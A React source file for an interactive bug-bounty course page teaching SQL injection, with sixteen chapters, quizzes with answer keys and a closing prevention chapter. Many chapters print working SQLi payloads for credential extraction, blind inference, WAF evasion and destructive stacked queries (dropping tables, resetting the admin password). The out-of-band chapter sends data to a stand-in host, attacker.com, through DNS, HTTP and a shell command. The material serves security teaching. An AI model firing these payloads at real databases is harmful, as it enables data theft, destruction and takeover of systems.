import React, { useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./SQLi.css";

const chapters = [
  {
    id: "what-is-sqli",
    title: "01 What is SQL Injection?",
    content: (
      <>
        <h2>What is SQL Injection (SQLi)?</h2>
        <p>
          SQL Injection (SQLi) is a critical web vulnerability that occurs when
          an application includes untrusted user input directly into an SQL
          query without proper sanitization or parameterization. An attacker
          can manipulate the intended query logic to read sensitive data,
          modify or delete records, bypass authentication, or in some cases
          execute operating-system commands on the database server.
        </p>
        <p>
          It has remained in the OWASP Top 10 for many years because it is
          still widely found in applications that build dynamic SQL queries
          using string concatenation.
        </p>
        <h3>How SQL Injection Works</h3>
        <ol>
          <li>Application accepts user input (forms, URL parameters, headers, cookies, etc.).</li>
          <li>The input is concatenated into an SQL query without sanitization.</li>
          <li>Attacker crafts malicious input that changes the query structure or logic.</li>
          <li>The database executes the modified query.</li>
          <li>Attacker gains unauthorized data access, authentication bypass, or further impact.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            SQLi = Injecting malicious SQL through user-controlled input to
            alter database queries and gain unauthorized access or data.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main cause of SQL Injection?",
      options: [
        "Using HTTPS",
        "Untrusted input concatenated into SQL queries",
        "Strong passwords",
        "Using prepared statements"
      ],
      correct: "Untrusted input concatenated into SQL queries",
    },
  },
  {
    id: "database-fundamentals",
    title: "02 Database Fundamentals",
    content: (
      <>
        <h2>Database Fundamentals</h2>
        <p>
          Before exploiting SQL Injection you must understand how relational
          databases work. Most SQLi targets use MySQL, PostgreSQL, Microsoft
          SQL Server, or Oracle.
        </p>
        <h3>Core Concepts</h3>
        <ul>
          <li><strong>Database</strong> – Collection of related data organized in tables.</li>
          <li><strong>Table</strong> – Structured set of rows and columns.</li>
          <li><strong>Row / Record</strong> – A single entry in a table.</li>
          <li><strong>Column / Field</strong> – A specific attribute of the data.</li>
          <li><strong>Primary Key</strong> – Unique identifier for each row.</li>
          <li><strong>Foreign Key</strong> – Links rows between tables.</li>
        </ul>
        <h3>Common Database Systems</h3>
        <ul>
          <li>MySQL / MariaDB</li>
          <li>PostgreSQL</li>
          <li>Microsoft SQL Server (MSSQL)</li>
          <li>Oracle</li>
          <li>SQLite</li>
        </ul>
        <h3>Important System Tables / Views</h3>
        <pre className="payload-box">
{`information_schema.tables
information_schema.columns
information_schema.schemata
sys.tables / sys.columns          (MSSQL)
all_tables / all_tab_columns      (Oracle)`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Understanding tables, columns, and information_schema is essential
            for successful database enumeration during SQLi exploitation.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which system schema is commonly used in MySQL for enumeration?",
      options: [
        "sys_schema",
        "information_schema",
        "mysql_private",
        "admin_schema"
      ],
      correct: "information_schema",
    },
  },
  {
    id: "sql-query-basics",
    title: "03 SQL Query Basics",
    content: (
      <>
        <h2>SQL Query Basics</h2>
        <p>
          Knowing basic SQL syntax helps you craft payloads that blend into
          legitimate queries and understand how the database will interpret them.
        </p>
        <h3>Essential Statements</h3>
        <pre className="payload-box">
{`SELECT column1, column2 FROM table WHERE condition;
INSERT INTO table (col1, col2) VALUES (val1, val2);
UPDATE table SET col1 = val1 WHERE condition;
DELETE FROM table WHERE condition;
DROP TABLE table_name;`}
        </pre>
        <h3>Useful Clauses & Operators</h3>
        <ul>
          <li><code>WHERE</code> – Filters rows</li>
          <li><code>AND / OR</code> – Logical operators</li>
          <li><code>UNION</code> – Combines results of two SELECT statements</li>
          <li><code>ORDER BY</code> – Sorts results (also useful for column counting)</li>
          <li><code>LIMIT / OFFSET</code> or <code>TOP</code> – Restricts number of rows</li>
          <li><code>--</code> or <code>#</code> – Comments (rest of query is ignored)</li>
        </ul>
        <h3>String & Comment Handling</h3>
        <pre className="payload-box">
{`Strings are usually enclosed in single quotes: 'value'
Comments:
  -- (MySQL, PostgreSQL, MSSQL)
  #  (MySQL)
  /* multi-line comment */`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Master SELECT, WHERE, UNION, ORDER BY, and comment syntax.
            These are the building blocks of almost every SQLi payload.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which clause is commonly used to find the number of columns?",
      options: [
        "GROUP BY",
        "ORDER BY",
        "HAVING",
        "LIMIT"
      ],
      correct: "ORDER BY",
    },
  },
  {
    id: "attack-surface",
    title: "04 SQL Injection Attack Surface",
    content: (
      <>
        <h2>SQL Injection Attack Surface</h2>
        <p>
          SQLi can appear anywhere user-controlled data reaches a database
          query. Always test every input point.
        </p>
        <h3>Common Injection Points</h3>
        <ul>
          <li>URL query parameters (<code>?id=1</code>)</li>
          <li>POST body parameters (login forms, search boxes)</li>
          <li>HTTP Headers (User-Agent, Referer, X-Forwarded-For, Cookie)</li>
          <li>JSON / XML body fields</li>
          <li>File upload metadata or content (when parsed into SQL)</li>
          <li>Second-order inputs (data stored and later used in a query)</li>
        </ul>
        <h3>Detection Indicators</h3>
        <ul>
          <li>Application behaves differently with <code>'</code> or <code>"</code></li>
          <li>SQL error messages appear</li>
          <li>Boolean conditions change the page content or status</li>
          <li>Time delays occur with SLEEP / WAITFOR payloads</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Test every parameter, header, and body field. SQLi is not limited
            to obvious form fields.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Where can SQL Injection occur?",
      options: [
        "Only in login forms",
        "Any user-controlled input that reaches a SQL query",
        "Only in URL parameters",
        "Only in cookies"
      ],
      correct: "Any user-controlled input that reaches a SQL query",
    },
  },
  {
    id: "sqli-types",
    title: "05 SQLi Types",
    content: (
      <>
        <h2>Types of SQL Injection</h2>
        <h3>1. In-Band (Classic) SQLi</h3>
        <p>
          Results or errors are returned directly in the application response.
          Includes Error-based and Union-based techniques.
        </p>
        <h3>2. Blind SQLi</h3>
        <p>
          No direct data or error is returned. Attackers use Boolean-based or
          Time-based techniques to infer information.
        </p>
        <h3>3. Out-of-Band (OOB) SQLi</h3>
        <p>
          Data is exfiltrated through alternative channels (DNS, HTTP requests)
          when direct responses are blocked.
        </p>
        <h3>4. Second-Order SQLi</h3>
        <p>
          Payload is stored safely at first, then executed later in a different
          context (e.g., admin report generation).
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Main categories: In-Band, Blind, Out-of-Band, and Second-Order.
            Choose the technique based on how (or if) the application responds.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which type of SQLi returns data directly in the response?",
      options: [
        "Blind SQLi",
        "In-Band SQLi",
        "Only Out-of-Band",
        "Only Second-Order"
      ],
      correct: "In-Band SQLi",
    },
  },
  {
    id: "in-band",
    title: "06 In-Band SQL Injection",
    content: (
      <>
        <h2>In-Band SQL Injection</h2>
        <p>
          In-band SQLi is the easiest and most common form. The attacker uses
          the same communication channel to both launch the attack and gather
          results. It includes Error-based and Union-based methods.
        </p>
        <h3>Characteristics</h3>
        <ul>
          <li>Application reflects query results or error messages</li>
          <li>Fastest way to extract data</li>
          <li>Ideal starting point when testing</li>
        </ul>
        <h3>Typical Workflow</h3>
        <ol>
          <li>Confirm injection with a simple quote or boolean payload.</li>
          <li>Identify database type from error messages or version functions.</li>
          <li>Use Error-based or Union-based techniques to extract data.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            When the application shows SQL errors or reflects data, prioritize
            In-Band techniques (Error-based and Union-based).
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "In-Band SQLi includes which techniques?",
      options: [
        "Only Time-based",
        "Error-based and Union-based",
        "Only Out-of-Band",
        "Only Second-Order"
      ],
      correct: "Error-based and Union-based",
    },
  },
  {
    id: "error-based",
    title: "07 Error-Based SQL Injection",
    content: (
      <>
        <h2>Error-Based SQL Injection</h2>
        <p>
          Error-based SQLi forces the database to generate error messages that
          contain the data you want to extract.
        </p>
        <h3>MySQL</h3>
        <pre className="payload-box">
{`' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--`}
        </pre>
        <h3>Microsoft SQL Server</h3>
        <pre className="payload-box">
{`' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT DB_NAME()))--`}
        </pre>
        <h3>PostgreSQL</h3>
        <pre className="payload-box">
{`' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Error-based techniques are fast when verbose errors are enabled.
            Use database-specific functions to leak data through error messages.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which function is commonly used for Error-based SQLi in MySQL?",
      options: [
        "SLEEP()",
        "UPDATEXML() or EXTRACTVALUE()",
        "pg_sleep()",
        "WAITFOR DELAY"
      ],
      correct: "UPDATEXML() or EXTRACTVALUE()",
    },
  },
  {
    id: "union-based",
    title: "08 Union-Based SQL Injection",
    content: (
      <>
        <h2>Union-Based SQL Injection</h2>
        <p>
          Union-based SQLi appends an extra SELECT statement so the attacker
          can retrieve data from other tables in the same response.
        </p>
        <h3>Step 1 – Find Column Count</h3>
        <pre className="payload-box">
{`' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--   ← error means 3 columns`}
        </pre>
        <h3>Step 2 – Confirm Injectable Columns</h3>
        <pre className="payload-box">
{`' UNION SELECT null, null, null--
' UNION SELECT 1, 2, 3--`}
        </pre>
        <h3>Step 3 – Extract Data</h3>
        <pre className="payload-box">
{`' UNION SELECT 1, username, password FROM users--
' UNION SELECT 1, table_name, null FROM information_schema.tables--
' UNION SELECT 1, column_name, null FROM information_schema.columns WHERE table_name='users'--`}
        </pre>
        <h3>Requirements</h3>
        <ul>
          <li>Same number of columns in both SELECT statements</li>
          <li>Compatible data types</li>
          <li>Application must display the query results</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Determine column count with ORDER BY, then use UNION SELECT to
            extract data from any table the database user can access.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the first step in Union-based SQLi?",
      options: [
        "Drop all tables",
        "Find the number of columns using ORDER BY",
        "Only use SLEEP()",
        "Only test XSS"
      ],
      correct: "Find the number of columns using ORDER BY",
    },
  },
  {
    id: "blind-sqli",
    title: "09 Blind SQL Injection",
    content: (
      <>
        <h2>Blind SQL Injection</h2>
        <p>
          Blind SQLi occurs when the application does not return query results
          or detailed error messages. The attacker must infer information
          through true/false conditions or side-channel effects.
        </p>
        <h3>Boolean-Based Blind</h3>
        <p>
          The application behaves differently for true and false conditions
          (different content, status code, or redirect).
        </p>
        <pre className="payload-box">
{`' AND 1=1--          → True (normal page)
' AND 1=2--          → False (different page / error)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--`}
        </pre>
        <h3>Character-by-Character Extraction</h3>
        <pre className="payload-box">
{`' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND (SELECT SUBSTRING(database(),2,1))='b'--
... continue until full string is recovered`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Boolean-based Blind SQLi relies on observable differences between
            true and false responses to extract data one bit or character at a time.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "How does Boolean-based Blind SQLi extract data?",
      options: [
        "By showing full table dumps",
        "By observing true/false differences in responses",
        "By using only UNION",
        "By dropping tables"
      ],
      correct: "By observing true/false differences in responses",
    },
  },
  {
    id: "time-based",
    title: "10 Time-Based Blind SQLi",
    content: (
      <>
        <h2>Time-Based Blind SQL Injection</h2>
        <p>
          When even boolean responses are not distinguishable, attackers use
          time delays. If the response is delayed, the condition was true.
        </p>
        <h3>MySQL</h3>
        <pre className="payload-box">
{`' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--`}
        </pre>
        <h3>Microsoft SQL Server</h3>
        <pre className="payload-box">
{`'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--`}
        </pre>
        <h3>PostgreSQL</h3>
        <pre className="payload-box">
{`'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`}
        </pre>
        <h3>Oracle</h3>
        <pre className="payload-box">
{`' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Time-based Blind SQLi is slower but works when no visual or boolean
            difference exists. Use conditional SLEEP / WAITFOR / pg_sleep.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which function is used for time delay in MySQL?",
      options: [
        "WAITFOR DELAY",
        "SLEEP()",
        "pg_sleep()",
        "DBMS_PIPE"
      ],
      correct: "SLEEP()",
    },
  },
  {
    id: "out-of-band",
    title: "11 Out-of-Band SQL Injection",
    content: (
      <>
        <h2>Out-of-Band (OOB) SQL Injection</h2>
        <p>
          Out-of-Band SQLi exfiltrates data through a different channel
          (usually DNS or HTTP) when the application does not return results
          and time-based techniques are impractical.
        </p>
        <h3>Microsoft SQL Server – xp_dirtree / DNS</h3>
        <pre className="payload-box">
{`'; EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT @@version) + '\\share'--`}
        </pre>
        <h3>Oracle – UTL_HTTP / DNS</h3>
        <pre className="payload-box">
{`' AND UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual)) = '1'--
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual) || '.attacker.com') IS NOT NULL--`}
        </pre>
        <h3>PostgreSQL</h3>
        <pre className="payload-box">
{`'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'--`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            OOB techniques send data to an attacker-controlled server via DNS
            or HTTP. Useful when in-band and time-based methods fail.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "How does Out-of-Band SQLi usually exfiltrate data?",
      options: [
        "Only through page content",
        "Through DNS or HTTP requests to attacker server",
        "Only through cookies",
        "Only through images"
      ],
      correct: "Through DNS or HTTP requests to attacker server",
    },
  },
  {
    id: "advanced",
    title: "12 Advanced SQLi Techniques",
    content: (
      <>
        <h2>Advanced SQL Injection Techniques</h2>
        <h3>Second-Order SQLi</h3>
        <p>
          Payload is stored in the database and executed later when another
          query uses that stored value (e.g., profile update → admin view).
        </p>
        <h3>Stacked Queries</h3>
        <pre className="payload-box">
{`'; DROP TABLE users--
'; INSERT INTO users VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--`}
        </pre>
        <h3>WAF Bypass Techniques</h3>
        <ul>
          <li>Case variation: <code>UnIoN SeLeCt</code></li>
          <li>Inline comments: <code>UN/**/ION/**/SELECT</code></li>
          <li>Encoding (URL, double URL, Unicode)</li>
          <li>Whitespace alternatives (tabs, comments, parentheses)</li>
          <li>Scientific notation / string concatenation tricks</li>
        </ul>
        <h3>Filter Evasion Examples</h3>
        <pre className="payload-box">
{`' UN/**/ION SE/**/LECT 1,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
%27%20UNION%20SELECT%20...`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Advanced techniques include second-order injection, stacked
            queries, and various WAF/filter bypass methods.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is Second-Order SQL Injection?",
      options: [
        "Payload executes immediately",
        "Payload is stored and executed later in another context",
        "Only works with UNION",
        "Only works with SLEEP"
      ],
      correct: "Payload is stored and executed later in another context",
    },
  },
  {
    id: "hunting-methodology",
    title: "13 SQLi Hunting Methodology",
    content: (
      <>
        <h2>SQL Injection Hunting Methodology</h2>
        <h3>Step-by-Step Approach</h3>
        <ol>
          <li><strong>Map the application</strong> – Identify all input points (parameters, headers, body, cookies).</li>
          <li><strong>Detect injection</strong> – Send <code>'</code>, <code>"</code>, <code>' OR 1=1--</code>, boolean and time-based probes.</li>
          <li><strong>Identify database</strong> – Use version functions or error messages.</li>
          <li><strong>Determine technique</strong> – In-band, Blind, or OOB based on responses.</li>
          <li><strong>Enumerate structure</strong> – Databases → Tables → Columns.</li>
          <li><strong>Extract data</strong> – Sensitive tables (users, credentials, PII).</li>
          <li><strong>Assess impact</strong> – Authentication bypass, data dump, potential RCE.</li>
          <li><strong>Document & report</strong> – Clear steps, payloads, and business impact.</li>
        </ol>
        <h3>Useful Tools</h3>
        <ul>
          <li>Burp Suite (Repeater, Intruder)</li>
          <li>sqlmap (automation & verification)</li>
          <li>Manual testing with browser + proxy</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Follow a structured methodology: detect → identify DB → choose
            technique → enumerate → extract → report.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the correct order in SQLi methodology?",
      options: [
        "Extract → Detect → Enumerate",
        "Detect → Identify DB → Enumerate → Extract",
        "Only use sqlmap",
        "Only test login page"
      ],
      correct: "Detect → Identify DB → Enumerate → Extract",
    },
  },
  {
    id: "payloads",
    title: "14 SQL Injection Payloads",
    content: (
      <>
        <h2>Useful SQL Injection Payloads</h2>
        <h3>Detection / Authentication Bypass</h3>
        <pre className="payload-box">
{`'
'
"
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin' #
' OR '1'='1' /*`}
        </pre>
        <h3>Union-Based</h3>
        <pre className="payload-box">
{`' ORDER BY 1--
' UNION SELECT null,null,null--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
' UNION SELECT table_name,null FROM information_schema.tables--`}
        </pre>
        <h3>Error-Based (MySQL)</h3>
        <pre className="payload-box">
{`' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--`}
        </pre>
        <h3>Time-Based</h3>
        <pre className="payload-box">
{`' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`}
        </pre>
        <h3>Boolean-Based</h3>
        <pre className="payload-box">
{`' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(database(),1,1))='a'--`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Keep a solid payload list for detection, union, error, time-based,
            and boolean techniques. Adapt them to the target database.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which payload is commonly used for authentication bypass?",
      options: [
        "' OR 1=1--",
        "SLEEP(5)",
        "ORDER BY 1",
        "UNION SELECT null"
      ],
      correct: "' OR 1=1--",
    },
  },
  {
    id: "enumeration",
    title: "15 Database Enumeration",
    content: (
      <>
        <h2>Database Enumeration</h2>
        <p>
          After confirming SQLi, systematically enumerate the database structure
          to locate sensitive data.
        </p>
        <h3>MySQL / MariaDB</h3>
        <pre className="payload-box">
{`SELECT database();
SELECT user();
SELECT version();
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT username,password FROM users;`}
        </pre>
        <h3>Microsoft SQL Server</h3>
        <pre className="payload-box">
{`SELECT DB_NAME();
SELECT @@version;
SELECT name FROM sys.databases;
SELECT name FROM sysobjects WHERE xtype='U';
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users');`}
        </pre>
        <h3>PostgreSQL</h3>
        <pre className="payload-box">
{`SELECT current_database();
SELECT version();
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';`}
        </pre>
        <h3>Typical High-Value Targets</h3>
        <ul>
          <li>users / accounts / members tables</li>
          <li>password / hash / salt columns</li>
          <li>email, phone, PII fields</li>
          <li>admin / role / privilege tables</li>
          <li>configuration or API key tables</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Enumerate databases → tables → columns → data. Focus on credential
            and PII tables for maximum impact.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the correct enumeration order?",
      options: [
        "Data → Columns → Tables",
        "Databases → Tables → Columns → Data",
        "Only extract passwords",
        "Only use SLEEP"
      ],
      correct: "Databases → Tables → Columns → Data",
    },
  },
  {
    id: "prevention",
    title: "16 SQL Injection Prevention",
    content: (
      <>
        <h2>SQL Injection Prevention</h2>
        <h3>Best Practices</h3>
        <ul>
          <li><strong>Parameterized queries / Prepared statements</strong> – Never concatenate user input into SQL.</li>
          <li>Use ORM frameworks that handle escaping (with caution – still verify).</li>
          <li>Apply least privilege to the database account used by the application.</li>
          <li>Validate and sanitize input (whitelist preferred over blacklist).</li>
          <li>Disable detailed database error messages in production.</li>
          <li>Keep database engines and libraries updated.</li>
          <li>Use Web Application Firewalls (WAF) as a secondary defense layer.</li>
          <li>Prefer stored procedures with proper parameterization when needed.</li>
          <li>Implement proper Content Security Policy and secure coding standards.</li>
        </ul>
        <h3>Example – Safe Parameterized Query (PHP PDO)</h3>
        <pre className="payload-box">
{`$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);`}
        </pre>
        <h3>Example – Safe Parameterized Query (Python)</h3>
        <pre className="payload-box">
{`cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            The most effective defense is parameterized queries. Never build
            SQL statements by concatenating user-controlled data.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the most effective defense against SQL Injection?",
      options: [
        "Using CAPTCHA",
        "Parameterized queries / Prepared statements",
        "Only using POST requests",
        "Disabling JavaScript"
      ],
      correct: "Parameterized queries / Prepared statements",
    },
  },
];

const SQLi = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState([]);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;

    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">SQL Injection</span>
          </h1>
          <p className="article-date">Interactive Course • 2026</p>
        </div>
      </section>

      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/erUlFWe72AQA16NPyk67/image.png"
          alt="SQL Injection Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x420/1a0b2e/a855f7?text=SQL+Injection";
          }}
        />
      </section>

      <section className="article-body">
        <div className="article-container">
          <aside className="article-sidebar">
            <h3>On this Article</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${activeChapter.id === chapter.id ? "active" : ""} ${
                    completedChapters.includes(chapter.id) ? "completed" : ""
                  }`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>

                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>

                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default SQLi;